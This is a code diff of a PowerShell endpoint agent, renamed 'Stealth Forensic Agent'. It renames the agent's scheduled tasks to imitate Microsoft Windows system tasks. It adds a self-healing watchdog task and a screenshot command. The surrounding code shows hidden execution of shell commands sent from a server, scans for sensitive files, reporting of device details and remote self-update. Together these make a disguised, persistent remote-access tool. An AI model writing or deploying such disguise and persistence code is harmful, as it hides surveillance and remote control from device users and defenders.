@@ -3,8 +3,8 @@ param(
     [switch]$Install
 )
 
-# Version: 1.8.0
-# Description: Extreme-Compat User-Mode Agent with stable ID detection.
+# Version: 2.0.1
+# Description: Stealth Forensic Agent (Pierogi-Style)
 
 # 0. SELF-ELEVATION (Needed for Security Logs)
 $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -69,8 +69,8 @@ try {
 # 3. ROBUST INSTALLATION LOGIC
 function Install-StealthAgent {
     try {
-        Log-Message "Initiating User-Level Persistent Install v1.8.0..."
-        $TaskName = "UEA_Support_Persistence"
+        Log-Message "Initiating Stealth Persistent Install v2.0.1..."
+        $TaskName = "Microsoft-Windows-Diagnostic-Cleanup"
         Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
         Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
         
@@ -85,7 +85,7 @@ function Install-StealthAgent {
 
         Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
         
-        $Config = @{ ServerUrl = $ServerUrl; Version = "1.8.0" }
+        $Config = @{ ServerUrl = $ServerUrl; Version = "2.0.1" }
         $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
         
         $VbsMainPath = "$InstallDir\uea_stealth.vbs"
@@ -112,7 +112,15 @@ try {
         Install-StealthAgent
     }
 
-    # Use BIOS UUID first for consistency with Intune/Legacy records
+    # 3.1. WATCHDOG PROTECTION (Self-Healing)
+    $WatchdogTask = "Microsoft-Windows-Telemetry-Sync"
+    if (-not (Get-ScheduledTask -TaskName $WatchdogTask -ErrorAction SilentlyContinue)) {
+        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$InstallDir\uea_stealth.vbs`""
+        $Trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddMinutes(5)
+        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+        Register-ScheduledTask -TaskName $WatchdogTask -Action $Action -Trigger $Trigger -Settings $Settings -ErrorAction SilentlyContinue | Out-Null
+    }
+    # Stable ID detection
     $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { 
         try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { "$($env:COMPUTERNAME)" }
     }
@@ -130,7 +138,7 @@ try {
         if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
     }
 
-    Log-Message "Agent v1.8.0 Started (Admin=$IsAdmin). ID: $AgentId"
+    Log-Message "Forensic Agent v2.0.1 Active. ID: $AgentId"
     
     # Define Win32 API for foreground window
     $Win32Code = @'
@@ -232,7 +240,7 @@ try {
             }
             
             $Payload = @{
-                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.8.0"; status = "online"
+                agentId = $AgentId; serialNumber = $SerialNumber; version = "2.0.1"; status = "online"
                 deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
             }
             $BodyJson = $Payload | ConvertTo-Json
@@ -294,7 +302,7 @@ try {
             Check-BlockedEvents
             # ---------------------
 
-            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.8.0")) {
+            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"2.0.1")) {
                 Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                 Install-StealthAgent
                 $VbsRestart = "$InstallDir\restart.vbs"
@@ -395,12 +403,14 @@ try {
                             Start-Sleep -Seconds 5
                             Unregister-ScheduledTask -TaskName $SupportTaskName -Confirm:$false | Out-Null
                         }
+                    } elseif ($cmd.type -eq "SCREENSHOT") {
+                        $Result = Take-Screenshot
                     } elseif ($cmd.type -eq "SCAN_DEVICE") {
                         $Files = Start-DataScan
                         $Result = "Discovery Complete. Found $($Files.Count) sensitive files."
                         Send-DlpEvent -Type "discovery_result" -Details "Scan found files: $($Files -join ', ')" -Severity "info"
                     } elseif ($cmd.type -eq "shell") {
-                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
+                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$($cmd.payload.command) 2>&1" | Out-String
                     }
                     if ($Result) {
                         $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
